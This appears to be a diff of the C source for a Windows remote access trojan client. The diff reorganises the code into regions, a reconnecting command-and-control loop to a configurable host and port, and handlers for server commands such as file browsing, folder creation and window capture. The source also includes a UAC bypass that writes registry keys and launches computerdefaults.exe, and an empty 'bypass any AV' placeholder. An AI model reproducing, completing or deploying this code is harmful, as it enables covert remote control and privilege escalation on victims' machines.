@@ -4,6 +4,10 @@
 // * @author         justalghamdi
 // * @version        Release: 0.1
 // *
+ 
+#pragma region MACROS
+
+//! START MACROS
 #define _CRT_SECURE_NO_WARNINGS
 
 
@@ -27,8 +31,9 @@
 #pragma comment(lib, "winmm.lib" )
 #pragma comment(lib, "Shlwapi.lib")
 
-//! START MACROS
 
+
+#pragma region commands_to_send_from_client
 /* START client send tags */
 #define _CLIENT_SEND_MAIN_DIR "client_recv_main_dir;"
 #define _CLIENT_SEND_SUB_MAIN_FILES  "client_recv_sub_main_files;"
@@ -40,7 +45,9 @@
 #define _ACTIVE_WINDOW "actv_wndw;"
 #define _MAIN_DIRS "main_dirs;"
 /* END client send tags */
+#pragma endregion
 
+#pragma region command_to_recv_from_server
 /* START server recv tags */
 #define _START_FILE_EXPLORER "start_fileexplorer;"
 #define _GET_THIS_SUB_PATH "get_this_sub_path;"
@@ -60,7 +67,10 @@
 #define _NEW_FOLDER "new_folder;"
 #define _GET_MAIN_DIRS "get_main_dirs;"
 /* END server recv tags */
+#pragma endregion
 
+
+#pragma region define_short_cuts
 /* START connection failed tags */
 #define ALREADY_CONNECT  10056
 #define CONNECTION_REFUSED 10061
@@ -68,17 +78,21 @@
 
 // START define size_s
 #define _1KB 1024
-#define _4KB 4096
-#define _9KB 9216
+#define _2KB _1KB * 2
+#define _4KB _1KB * 4
+#define _9KB _1KB * 9
 // END define size_s
 
 // START define keywords
 #define loop for (;;)
 // END define keywords
+#pragma endregion
 
 
 //! END MACROS
+#pragma endregion
 
+#pragma region declare_functions
 /* START declare functions */
 char* inttostr(int n);
 void showConsole(BOOL);
@@ -102,38 +116,35 @@ _Bool UACPASSING(char*);
 //int silently_remove_directory(LPCTSTR dir);
 /* END declare functions */
 
+#pragma endregion
 
 
-// START define codes
 
-/*UACPAYPASS_PLACE_HOLDER_DEFINE*/
+#pragma region optional_code
+// START define option codes
+
+/*UACPAYPASS_PLACE_HOLDER_DEFINE*/ //DON't remove!!!
+
 #define UACBYPASS_ENABLE // DELETE THIS !!!
 
-#ifdef UACBYPASS_ENABLE
-#define UACBYPASS else if (strstr(srvr_recv,"uacbypass;") != NULL)\
-{\
-    UACPASSING(current_file_name);\
-	system("start computerdefaults.exe");\
-	exit(0);\
-\
-}
-#else
-#define UACBYPASS {}
-#endif
-
-// END define codes
+// END define option codes
+#pragma endregion
 
 
 
-#define HOST "127.0.0.1"
-#define PORT 8080
+#define HOST "127.0.0.1"//THIS
+#define PORT 8080//and THIS SHOULD BE a place holders and set by the server !
 
 INT APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow) {
 	
+#pragma region bypass_any_AV
+// TODO
 
-	//START bypass any AV
-	// TODO
-	//END bypass any AV
+#pragma endregion
+
+#pragma region conntion_region
+
+
 
 	char current_file_name[MAX_PATH];
 	GetModuleFileNameA(NULL, current_file_name, MAX_PATH);
@@ -156,39 +167,45 @@ _start:;
 		goto _start;
 	}
 	char* _IP = hostname_to_ip(HOST);
-	if (_IP != NULL) {
-		server.sin_addr.s_addr = inet_addr(_IP);
-		server.sin_family = AF_INET;
-		server.sin_port = htons(PORT);
+	if (_IP == NULL) {
+		goto _start; 
+	}
+	server.sin_addr.s_addr = inet_addr(_IP);
+	server.sin_family = AF_INET;
+	server.sin_port = htons(PORT);
 
-		if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
-		{
-			int err_code = WSAGetLastError();
-			if (err_code == ALREADY_CONNECT) {
-				goto _start;
-			}
-			else if (err_code == CONNECTION_REFUSED) {
-				Sleep(5000);
-				goto _start;
-			}
-			else {
-				goto _start;
-			}
+	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
+	{
+		int err_code = WSAGetLastError();
+		if (err_code == ALREADY_CONNECT) {
+			goto _start;
 		}
-		char* srvr_recv;
-		int recv_size = 0,
-			empty_recv = 0;
-		DWORD cht_ThreadID;
-		HANDLE cht_hndl = NULL;
-		setsockopt(
+		else if (err_code == CONNECTION_REFUSED) {
+			Sleep(5000);
+			goto _start;
+		}
+		else {
+			goto _start;
+		}
+	}
+	char* srvr_recv;
+	int recv_size = 0,
+		empty_recv = 0;
+	DWORD cht_ThreadID;
+	HANDLE cht_hndl = NULL;
+	setsockopt(
 			s,
 			IPPROTO_TCP,
 			TCP_NODELAY,
 			(const char*)1,
 			sizeof(BOOL)
-		);
-		loop{
-			srvr_recv = calloc(2000, sizeof(char*));
+	);
+#pragma endregion
+
+#pragma region loop_region
+
+	loop{
+			srvr_recv = calloc(_2KB, sizeof(char*));
 			if ((recv_size = recv(s, srvr_recv, 2000, 0)) == SOCKET_ERROR)
 			{
 				goto _start;
@@ -581,18 +598,22 @@ _start:;
 				}
 				
 			}
-			UACBYPASS
-
+#ifdef UACBYPASS_ENABLE
+			else if (strstr(srvr_recv, "uacbypass;") != NULL)
+			{
+				UACPASSING(current_file_name); 
+				system("start computerdefaults.exe"); 
+				exit(0); 
+			} 
+#endif
 
 			//TODO: Complete commands `else if`
 			free(srvr_recv);
 			
 
 		}/* END loop */
-	}
-	else {
-		goto _start; //if (ip == NULL){ reset proccess}
-	}
+#pragma endregion
+	
 	return EXIT_SUCCESS;//! IT SHOULD NOT EXIT !!
 }
 
@@ -793,11 +814,12 @@ BOOL delete_folder(WCHAR * Wfolder) {
 	}
 	return FALSE;
 }
-
+#ifdef _DEBUG
 void print(const char* buffer) {
 	HANDLE __HSTDOUT = GetStdHandle(STD_OUTPUT_HANDLE);
 	WriteConsoleA(__HSTDOUT, buffer, (UINT)strlen(buffer), (UINT*)0, NULL);
 }
+#endif
 
 char** split(const char* str, const char* delim) {
 	char* s = _strdup(str);
@@ -1032,6 +1054,9 @@ char* inttostr(int n) {
 	return result;
 }
 
+
+#pragma region OPTIONAL_FUNCTIONS
+#ifdef UACBYPASS_ENABLE
 int CreateRegKey(char* path) {
 	HKEY hKey;
 	DWORD ZERO = 0;
@@ -1113,3 +1138,7 @@ BOOL IsElevated() {
 	}
 	return fRet;
 }
+
+#endif
+#pragma endregion
+
